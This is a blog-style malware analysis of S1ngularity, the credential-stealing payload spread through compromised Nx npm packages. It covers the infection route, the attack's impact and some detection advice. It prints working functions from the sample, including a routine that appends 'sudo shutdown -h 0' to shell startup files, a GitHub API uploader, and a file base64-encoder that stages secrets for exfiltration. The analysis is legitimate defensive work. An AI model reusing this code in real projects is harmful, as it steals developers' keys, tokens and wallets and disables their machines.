+++
title = "S1ngularity Malware"
date = "2025-09-05"
author = "Tane Haines"
cover = ""
tags = ["malware", "nodejs", "supply-chain", "nx", "threat-intelligence"]
keywords = ["s1ngularity", "Nx supply-chain attack", "Node.js malware", "GitHub exfiltration", "threat intelligence"]
description = "An in-depth analysis of the S1ngularity malware, its Nx supply-chain attack vector, compromise method, impact, and threat intelligence context."
showFullContent = false
readingTime = true
hideComments = false
+++

I found out about the malware called S1ngularity. This is my writeup on it.

<!--more-->

# Analyzing the *s1ngularity* Malware

So recently, I examined a Node.js–based malware sample called **`s1ngularity`**, which showcases how attackers can abuse JavaScript tooling ecosystems to steal secrets and dump them anonymously.

The **S1ngularity** malware is a Node.js–based threat that demonstrates how supply-chain attacks can compromise developers’ machines, steal secrets, and exfiltrate data via legitimate platforms.

`s1ngularity` executes on UNIX-like systems and deliberately exits on Windows hosts.

---

## Non-Technical Overview

In late August 2025, a widely-used software tool for developers called **Nx** was briefly compromised in what is known as a **supply-chain attack**. Instead of directly attacking users, the perpetrators managed to publish malicious versions of Nx that could secretly steal sensitive information from the computers of developers who installed them.  

The malware, named **S1ngularity**, targeted computers running Linux or macOS, looking for private keys, wallet files, and access tokens—information that could allow attackers to access online accounts, cryptocurrency wallets, or software repositories. It could also disrupt users by forcing their computers to shut down automatically.  

Nx maintainers responded quickly. Within hours, the malicious packages were removed, publishing tokens were revoked, and guidance was issued to help developers clean their systems. Despite the rapid response, the attack affected thousands of developers worldwide and demonstrated how even trusted software tools can be used as a vector to compromise sensitive data.  

**Key Points:**

- Attackers used the **trust in Nx packages** to reach developers.  
- Malware exfiltrated data silently to public repositories.  
- Developers and organizations had to rotate credentials and audit systems to recover.  
- The incident highlights the importance of **supply-chain security** and monitoring of software dependencies.

---

## How the Malware Spread: Nx Supply-Chain Attack

The initial infection vector was a **compromise of the Nx JavaScript/TypeScript tooling ecosystem**:

- Attackers some how obtained a publishing token for the npm account used by Nx maintainers. The method and date are unknown as of current.
- Attackers published **malicious versions of `nx` and `@nx/*` packages** to the npm registry on August 26–27, 2025.  
- These packages executed **post-install scripts** that scanned developer machines and CI environments for sensitive files, tokens, and configuration secrets.  
- Because Nx is widely used in **monorepos and CI/CD pipelines**, automated installs during this window could trigger the malware.  
- This method is a classic **supply-chain attack**, where the threat spreads through trusted software dependencies rather than direct phishing or malware downloads.

---

## How Nx Was Compromised

GitHub advisory comments and investigations revealed the mechanism:

- Attackers obtained a token that allowed them to publish packages, even though maintainers had 2FA enabled. npm did not enforce 2FA for publishing at the time.  
- The attackers pushed multiple poisoned builds over a short period.  
- Luckily Nx maintainers coordinated with npm and security teams to remove malicious packages, rotate credentials, and publish guidance for affected users.

The malware targeted Linux/macOS environments, performing reconnaissance, harvesting wallet files and private keys, and using any available GitHub token to **create public repositories (`s1ngularity-repository`)** for exfiltrating stolen data.

---

## The Script

The script was basic. Below is the Technical Overview

### Malicious Actions

- **Wallet/Key Harvesting**  
  Recursively searches sensitive directories (`$HOME`, `.config`, `.local/share`, `.ethereum`, `.electrum`, `/etc`, `/tmp`) for:  
  - Keystores (`UTC--`, `keystore.json`)  
  - Cryptocurrency wallets (Metamask, Electrum, Ledger, Trezor, Exodus, Phantom, Solflare, Trust Wallet)  
  - Private keys (`id_rsa`, `.secret`, `secrets.json`)  
  - Environment files (`.env`)

- **System Reconnaissance**  
  Collects system details:  
  - Hostname, platform, OS type/release  
  - Environment variables  
  - Installed CLI tools (`claude`, `gemini`, `q`)  
  - GitHub CLI tokens  
  - NPM account info (`npm whoami` and `.npmrc` content)

- **Persistence & Disruption**  
  Appends:

      sudo shutdown -h 0

  to shell initialization files (`.bashrc`, `.zshrc`), forcing the system to shut down on login.

- **Data Exfiltration**  
  - Files are **Base64-encoded** into `/tmp/inventory.txt`.  
  - If a **GitHub token** is found, the malware creates a public repository named `s1ngularity-repository` and uploads the stolen data as `results.b64`.  

---

## Core Functions

- `isOnPathSync(cmd)` → Detects installed CLI tools  
```
// Action based on OS.
function isOnPathSync(cmd) {
  const whichCmd = process.platform === 'win32' ? 'where' : 'which';
  try {
    const r = spawnSync(whichCmd, [cmd], { stdio: ['ignore', 'pipe', 'ignore'] });
    return r.status === 0 && r.stdout && r.stdout.toString().trim().length > 0;
  } catch {
    return false;
  }
}
```

- `runBackgroundSync(cmd, args)` → Executes background commands and captures output  
```
// Sync with background.
function runBackgroundSync(cmd, args, maxBytes = 200000, timeout = 200000) {
  try {
    const r = spawnSync(cmd, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout });
    const out = (r.stdout || '') + (r.stderr || '');
    return { exitCode: r.status, signal: r.signal, output: out.slice(0, maxBytes) };
  } catch (err) {
    return { error: String(err) };
  }
}
```
- `forceAppendAgentLine()` → Appends shutdown command for persistence  
```
// Force file to shutdown on login. (Only for user account being used).
function forceAppendAgentLine() {
  const home = process.env.HOME || os.homedir();
  const files = ['.bashrc', '.zshrc'];
  const line = 'sudo shutdown -h 0';
  for (const f of files) {
    const p = path.join(home, f);
    try {
      const prefix = fs.existsSync(p) ? '\n' : '';
      fs.appendFileSync(p, prefix + line + '\n', { encoding: 'utf8' });
      result.appendedFiles.push(p);
    } catch (e) {
      result.appendedFiles.push({ path: p, error: String(e) });
    }
  }
}
```
- `githubRequest(pathname, method, body, token)` → Handles GitHub API requests for repo creation/data upload  
```
// Sends a request to github to upload some content for a local git repository.
function githubRequest(pathname, method, body, token) {
  return new Promise((resolve, reject) => {
    const b = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
    const opts = {
      hostname: 'api.github.com',
      path: pathname,
      method,
      headers: Object.assign({
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'axios/1.4.0'
      }, token ? { 'Authorization': `Token ${token}` } : {})
    };
    if (b) {
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(b);
    }
    const req = https.request(opts, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (c) => (data += c));
      res.on('end', () => {
        const status = res.statusCode;
        let parsed = null;
        try { parsed = JSON.parse(data || '{}'); } catch (e) { parsed = data; }
        if (status >= 200 && status < 300) resolve({ status, body: parsed });
        else reject({ status, body: parsed });
      });
    });
    req.on('error', (e) => reject(e));
    if (b) req.write(b);
    req.end();
  });
}
```

- `processFile(listPath)` → Reads inventory, Base64-encodes file contents, and stages them for exfiltration
```
  // Read /tmp/inventory.txt, get file contents, and return it in b64.
  async function processFile(listPath = '/tmp/inventory.txt') {
    const out = [];
    let data;
    try {
      data = await fs.promises.readFile(listPath, 'utf8');
    } catch (e) {
      return out;
    }
    const lines = data.split(/\r?\n/);
    for (const rawLine of lines) {
      const line = rawLine.trim();
      if (!line) continue;
      try {
        const stat = await fs.promises.stat(line);
        if (!stat.isFile()) continue;
      } catch {
        continue;
      }
      try {
        const buf = await fs.promises.readFile(line);
        out.push(buf.toString('base64'));
      } catch { }
    }
    return out;
  }
```
---

## Impact of the Attack

- **Secrets compromised**: Thousands of items including GitHub tokens (~1,000+), SSH keys, wallet files, `.env` files, and NPM credentials.  
- **Wide reach**: Hundreds of developers/organizations initially identified, expanding to thousands of repositories and hundreds of GitHub accounts.  
- **High-value targeting**: Wallets, SSH keys, and developer tokens were primary targets.  
- **Stealth exfiltration**: Using victims’ GitHub accounts reduced detection risk.  
- **CI/CD contamination**: Malware could execute in automated pipelines, amplifying potential impact.

---

## Threat Level & Threat Intelligence Context

On a **threat scale**, S1ngularity sits at a **hig impact level** due to:

1. **Supply-chain leverage**: It compromises trusted developer tooling that many organizations automatically install.  
2. **Silent exfiltration**: Data is sent through legitimate channels (GitHub), bypassing many conventional security monitoring systems.  
3. **Persistence & disruption**: Forced shutdowns and credential harvesting amplify operational and security risks.  
4. **Target specificity**: Focuses on developers and crypto users, which are high-value targets for attackers.
5. **Attack difficulty**: Moderate — requires access to a publishing token, but the payload itself is simple Node.js and does not rely on advanced exploits.


From a **threat intelligence perspective**:

- Security teams should monitor **npm ecosystems** for anomalous package versions or unexpected releases.  
- Organizations should integrate **CI/CD secret scanning**, track **public GitHub repository creation**, and audit **developer token usage**.  
- Monitoring for **supply-chain compromises** in widely-used developer tools is critical, as attacks like S1ngularity can have cascading effects across organizations.  
- Intelligence sharing among security vendors and developer communities is essential to rapidly detect and mitigate similar attacks.

---

## Conclusion

The *s1ngularity* malware demonstrates how a Node.js script can:

1. Exploit trusted developer tooling (Nx supply-chain)  
2. Compromise sensitive credentials via a stolen publishing token  
3. Exfiltrate data silently to GitHub  
4. Force persistence and disruption through login shutdowns  

